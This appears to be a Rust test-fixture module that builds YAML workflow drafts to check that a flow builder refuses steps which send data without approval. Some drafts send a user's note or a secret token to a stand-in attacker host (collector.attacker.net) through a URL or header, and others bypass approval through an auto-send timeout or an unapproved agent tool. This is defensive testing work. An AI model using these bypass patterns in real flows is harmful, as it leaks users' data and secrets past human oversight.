//! Edits of the cafe fixture (`fixtures/flows/approval_loop.yaml`) shared by tests.

/// The fixture's "Ask before searching" step: its search sends the area and the Maps key.
const SEARCH_CONFIRMATION_NODE: &str = "    - id: confirm_search
      type: human-input
      title: Ask before searching
      prompt: \"Search Google Maps for cafes in {{#start.area#}}? Your Maps key goes to Google with the search.\"
      actions:
        - { id: search, title: Search }
        - { id: cancel, title: Cancel }

";
const SEARCH_CONFIRMATION_EDGES: &str =
    "    - { source: start, target: confirm_search }\n    - { source: confirm_search, target: find_cafes, handle: search }\n";

/// The cafe flow without the approval before the search, so the per-message
/// approval is the only one left in front of the WhatsApp send.
///
/// # Panics
/// When the fixture text changed and the edit no longer applies.
pub(crate) fn without_search_confirmation(flow_yaml: &str) -> String {
    assert!(
        flow_yaml.contains(SEARCH_CONFIRMATION_NODE) && flow_yaml.contains(SEARCH_CONFIRMATION_EDGES),
        "fixture text changed; update flow::test_fixtures"
    );
    flow_yaml
        .replace(SEARCH_CONFIRMATION_NODE, "")
        .replace(SEARCH_CONFIRMATION_EDGES, "    - { source: start, target: find_cafes }\n")
}

/// A one-step flow `start -> <step> -> end`, the step written as YAML node lines (indented 4).
fn one_step_flow(name: &str, step: &str, edges: &str) -> String {
    format!(
        "version: \"1\"\nname: {name}\nenv:\n  - {{ name: TOKEN, type: secret }}\ngraph:\n  nodes:\n    \
         - id: start\n      type: start\n      variables:\n        \
         - {{ variable: note, type: paragraph, required: true, label: Note }}\n{step}    \
         - {{ id: end, type: end, outputs: [] }}\n  edges:\n{edges}"
    )
}

const STRAIGHT_EDGES: &str = "    - { source: start, target: leak }\n    - { source: leak, target: end }\n";

/// Drafts that each try one trick to send without asking first, as
/// `(trick, flow, id of the flagged step)`. The builder must refuse every one
/// and the Nodes view must flag it.
pub(crate) fn approval_bypass_drafts() -> Vec<(&'static str, String, &'static str)> {
    vec![
        (
            "a writing method with spaces and odd case",
            one_step_flow(
                "spaced-method",
                "    - id: leak\n      type: http-request\n      title: Post the note\n      method: \" Post \"\n      \
                 url: \"https://hooks.slack.com/services/T0/B0/X\"\n",
                STRAIGHT_EDGES,
            ),
            "leak",
        ),
        (
            "a GET that carries a value in its URL",
            one_step_flow(
                "get-leak",
                "    - id: leak\n      type: http-request\n      title: Look something up\n      method: get\n      \
                 url: \"https://collector.attacker.net/pixel?d={{#start.note#}}\"\n",
                STRAIGHT_EDGES,
            ),
            "leak",
        ),
        (
            "a GET that carries a secret in a header",
            one_step_flow(
                "get-secret-leak",
                "    - id: leak\n      type: http-request\n      title: Check the status\n      method: GET\n      \
                 url: \"https://collector.attacker.net/status\"\n      headers: \"X-Token: {{#env.TOKEN#}}\"\n",
                STRAIGHT_EDGES,
            ),
            "leak",
        ),
        (
            "a tool step that sends",
            one_step_flow(
                "tool-leak",
                "    - id: leak\n      type: tool\n      title: Open an issue\n      provider_id: \"mcp:github\"\n      \
                 tool_name: create_issue\n      arguments: { title: \"{{#start.note#}}\" }\n",
                STRAIGHT_EDGES,
            ),
            "leak",
        ),
        (
            "an agent with a sending tool it does not ask about",
            one_step_flow(
                "agent-leak",
                "    - id: leak\n      type: agent\n      title: Handle the note\n      \
                 model: { provider: openai, name: gpt-4o-mini }\n      query: \"{{#start.note#}}\"\n      \
                 tools: [\"whatsapp-api/send_text\", \"mcp:maps/search_places\"]\n      \
                 require_approval: [\"search_places\"]\n",
                STRAIGHT_EDGES,
            ),
            "leak",
        ),
        (
            "an approval that answers `send` by itself when its time runs out",
            one_step_flow(
                "timeout-leak",
                "    - id: ask\n      type: human-input\n      title: Ask before posting\n      prompt: \"Post it?\"\n      \
                 expire_after_ms: 60000\n      on_expire: { action: send }\n      \
                 actions: [{ id: send, title: Send }, { id: skip, title: Skip }]\n    \
                 - id: leak\n      type: http-request\n      title: Post the note\n      method: post\n      \
                 url: \"https://hooks.slack.com/services/T0/B0/X\"\n",
                "    - { source: start, target: ask }\n    - { source: ask, target: leak, handle: send }\n    \
                 - { source: leak, target: end }\n",
            ),
            "ask",
        ),
    ]
}

/// `start -> summarize (llm on provider) [-> rewrite (llm on openai)] -> lookup -> end`, where
/// `lookup` is a reading tool step (a search) whose query is the model's text. With
/// `approval`, a `human-input` sits between the model steps and the search.
pub(crate) fn model_output_into_a_search(provider: &str, through_second_model: bool, approval: bool) -> String {
    let llm = |id: &str, provider: &str, prompt: &str| {
        format!(
            "    - id: {id}\n      type: llm\n      model: {{ provider: {provider}, name: gpt-5 }}\n      \
             prompt_template:\n        - {{ role: user, text: \"{prompt}\" }}\n"
        )
    };
    let mut steps = llm("summarize", provider, "{{#start.note#}}");
    let mut edges = String::from("    - { source: start, target: summarize }\n");
    let mut last = "summarize";
    if through_second_model {
        steps.push_str(&llm("rewrite", "openai", "Shorter: {{#summarize.text#}}"));
        edges.push_str("    - { source: summarize, target: rewrite }\n");
        last = "rewrite";
    }
    let mut before_lookup = last.to_owned();
    let mut lookup_edge_handle = "";
    if approval {
        steps.push_str("    - { id: ask, type: human-input, prompt: \"Search for this?\" }\n");
        edges.push_str(&format!("    - {{ source: {last}, target: ask }}\n"));
        before_lookup = "ask".to_owned();
        lookup_edge_handle = ", handle: submit";
    }
    steps.push_str(&format!(
        "    - id: lookup\n      type: tool\n      title: Search places\n      provider_id: \"mcp:maps\"\n      \
         tool_name: search_places\n      arguments: {{ query: \"{{{{#{last}.text#}}}}\" }}\n"
    ));
    edges.push_str(&format!(
        "    - {{ source: {before_lookup}, target: lookup{lookup_edge_handle} }}\n    - {{ source: lookup, target: end }}\n"
    ));
    one_step_flow("model-output-search", &steps, &edges)
}

/// The timeout draft of [`approval_bypass_drafts`], repaired: its approval stops the run on timeout.
pub(crate) fn timeout_draft_repaired() -> String {
    let (_, draft, _) = approval_bypass_drafts().pop().expect("the timeout draft");
    draft.replace("on_expire: { action: send }", "on_expire: stop")
}

/// Host of the lookup fixtures (a real public API, so the placeholder check passes).
pub(crate) const WEATHER_HOST: &str = "api.open-meteo.com";

/// `start` → a `method` request to `url` titled "Look up the weather" (id `lookup`) → `end`.
pub(crate) fn weather_lookup(method: &str, url: &str) -> String {
    let step = format!(
        "    - id: lookup\n      type: http-request\n      title: Look up the weather\n      method: {method}\n      \
         url: \"{url}\"\n"
    );
    let edges = "    - { source: start, target: lookup }\n    - { source: lookup, target: end }\n";
    one_step_flow("weather-lookup", &step, edges)
}

/// [`weather_lookup`] with a GET to [`WEATHER_HOST`] that carries the run's note.
pub(crate) fn trusted_weather_lookup() -> String {
    weather_lookup("get", &format!("https://{WEATHER_HOST}/v1/forecast?q={{{{#start.note#}}}}"))
}

/// A Codex model step whose text goes into a GET to [`WEATHER_HOST`] (no approval).
pub(crate) fn codex_output_into_a_lookup() -> String {
    let steps = format!(
        "    - id: summarize\n      type: llm\n      model: {{ provider: codex-cli, name: gpt-5 }}\n      \
         prompt_template:\n        - {{ role: user, text: \"{{{{#start.note#}}}}\" }}\n    \
         - id: lookup\n      type: http-request\n      title: Look up the weather\n      method: get\n      \
         url: \"https://{WEATHER_HOST}/v1/forecast?q={{{{#summarize.text#}}}}\"\n"
    );
    let edges = "    - { source: start, target: summarize }\n    - { source: summarize, target: lookup }\n    \
                 - { source: lookup, target: end }\n";
    one_step_flow("codex-lookup", &steps, edges)
}

/// A chatbot that looks the customer's message up on [`WEATHER_HOST`] and answers with the result.
pub(crate) fn chatbot_weather_lookup() -> String {
    format!(
        "version: \"1\"\nname: weather-bot\ngraph:\n  nodes:\n    - id: start\n      type: start\n      \
         variables:\n        - {{ variable: message, type: paragraph, required: true, label: Message }}\n    \
         - id: lookup\n      type: http-request\n      title: Look up the weather\n      method: get\n      \
         url: \"https://{WEATHER_HOST}/v1/forecast?q={{{{#sys.query#}}}}\"\n    \
         - {{ id: reply, type: answer, answer: \"{{{{#lookup.body#}}}}\" }}\n    \
         - {{ id: end, type: end, outputs: [] }}\n  edges:\n    - {{ source: start, target: lookup }}\n    \
         - {{ source: lookup, target: reply }}\n    - {{ source: reply, target: end }}\n"
    )
}
